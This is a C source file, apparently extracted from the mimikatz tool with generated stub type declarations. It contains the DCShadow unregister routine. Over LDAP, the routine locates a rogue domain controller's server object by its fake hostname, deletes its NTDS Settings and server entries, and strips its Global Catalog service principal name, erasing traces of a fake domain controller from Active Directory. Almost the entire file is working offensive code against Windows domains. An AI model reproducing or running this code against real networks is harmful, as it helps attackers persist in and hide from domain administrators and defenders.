#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_8__   TYPE_3__ ;
typedef  struct TYPE_7__   TYPE_2__ ;
typedef  struct TYPE_6__   TYPE_1__ ;

/* Type definitions */
struct TYPE_6__ {char** modv_strvals; } ;
struct TYPE_8__ {char* mod_type; TYPE_1__ mod_vals; int /*<<< orphan*/  mod_op; int /*<<< orphan*/  member_0; } ;
struct TYPE_7__ {int /*<<< orphan*/  szFakeDN; int /*<<< orphan*/  ld; int /*<<< orphan*/  szDomainName; int /*<<< orphan*/  szFakeFQDN; int /*<<< orphan*/  szConfigurationNamingContext; } ;
typedef  char* PWSTR ;
typedef  TYPE_2__* PDCSHADOW_DOMAIN_INFO ;
typedef  int /*<<< orphan*/  NTSTATUS ;
typedef  TYPE_3__ LDAPMod ;
typedef  int /*<<< orphan*/  LDAPMessage ;
typedef  scalar_t__ DWORD ;
typedef  scalar_t__ BOOL ;

/* Variables and functions */
 scalar_t__ FALSE ; 
 int /*<<< orphan*/  LDAP_MOD_DELETE ; 
 int /*<<< orphan*/  LDAP_SCOPE_ONELEVEL ; 
 int /*<<< orphan*/  LDAP_SCOPE_SUBTREE ; 
 scalar_t__ LDAP_SUCCESS ; 
 int /*<<< orphan*/  LocalFree (char*) ; 
 int /*<<< orphan*/  PRINT_ERROR (char*,...) ; 
 int /*<<< orphan*/  STATUS_SUCCESS ; 
 int /*<<< orphan*/  STATUS_UNSUCCESSFUL ; 
 scalar_t__ TRUE ; 
 scalar_t__ kull_m_string_sprintf (char**,char*,int /*<<< orphan*/ ,...) ; 
 int ldap_count_entries (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 scalar_t__ ldap_delete_s (int /*<<< orphan*/ ,char*) ; 
 char* ldap_get_dnW (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  ldap_memfreeW (char*) ; 
 scalar_t__ ldap_modify_s (int /*<<< orphan*/ ,int /*<<< orphan*/ ,TYPE_3__**) ; 
 int /*<<< orphan*/  ldap_msgfree (int /*<<< orphan*/ *) ; 
 scalar_t__ ldap_search_sW (int /*<<< orphan*/ ,char*,int /*<<< orphan*/ ,char*,int /*<<< orphan*/ *,scalar_t__,int /*<<< orphan*/ **) ; 

NTSTATUS kuhl_m_lsadump_dcshadow_unregister(PDCSHADOW_DOMAIN_INFO info)
{
	BOOL fSuccess = FALSE;
	DWORD dwErr = 0;
	PWSTR sitesBase, sitesFilter, serverBase, NTDSBase;
	LDAPMessage* pSitesMessage, * pServerMessage;
	PWSTR szSPNAttribute[] = {NULL, NULL};
	LDAPMod ldapmodSPN = {0};
	LDAPMod *ldapmodServer[] = {&ldapmodSPN, NULL};
	
	if(kull_m_string_sprintf(&sitesBase, L"CN=Sites,%s", info->szConfigurationNamingContext))
	{
		if(kull_m_string_sprintf(&sitesFilter, L"(&(objectClass=server)(dNSHostName=%s))", info->szFakeFQDN))
		{
			dwErr = ldap_search_sW(info->ld, sitesBase, LDAP_SCOPE_SUBTREE, sitesFilter, NULL, FALSE, &pSitesMessage);
			if(dwErr == LDAP_SUCCESS)
			{
				if(ldap_count_entries(info->ld, pSitesMessage) == 1)
				{
					if(serverBase = ldap_get_dnW(info->ld, pSitesMessage))
					{
						dwErr = ldap_search_sW(info->ld, serverBase, LDAP_SCOPE_ONELEVEL, L"(name=NTDS Settings)", NULL, FALSE, &pServerMessage);
						if(dwErr == LDAP_SUCCESS)
						{
							if(NTDSBase = ldap_get_dnW(info->ld, pServerMessage))
							{
								if((dwErr = ldap_delete_s(info->ld, NTDSBase)) != LDAP_SUCCESS)
									PRINT_ERROR(L"ldap_delete_s %s 0x%x (%u)\n", NTDSBase, dwErr, dwErr);
								else fSuccess = TRUE;
								ldap_memfreeW(NTDSBase);
							}
							ldap_msgfree(pServerMessage);
						}
						else PRINT_ERROR(L"ldap_search_s 0x%x (%u)\n", dwErr, dwErr);
						if((dwErr = ldap_delete_s(info->ld, serverBase)) != LDAP_SUCCESS)
							PRINT_ERROR(L"ldap_delete_s %s 0x%x (%u)\n", serverBase, dwErr, dwErr);
						ldap_memfreeW(serverBase);
					}
				}
				else PRINT_ERROR(L"ldap_count_entries is NOT 1\n");
				ldap_msgfree(pSitesMessage);
			}
			else PRINT_ERROR(L"ldap_search_s 0x%x (%u)\n", dwErr, dwErr);
			LocalFree(sitesFilter);
		}
		LocalFree(sitesBase);
	}

	ldapmodSPN.mod_op = LDAP_MOD_DELETE;
	ldapmodSPN.mod_type = L"servicePrincipalName";
	ldapmodSPN.mod_vals.modv_strvals = szSPNAttribute;
	if(kull_m_string_sprintf(szSPNAttribute, L"GC/%s/%s", info->szFakeFQDN, info->szDomainName))
	{
		if((dwErr = ldap_modify_s(info->ld, info->szFakeDN, ldapmodServer)) != 0)
			PRINT_ERROR(L"ldap_modify_s computer SPN 0x%x (%u)\n", dwErr, dwErr); 
	}
	return (fSuccess?STATUS_SUCCESS: STATUS_UNSUCCESSFUL);
}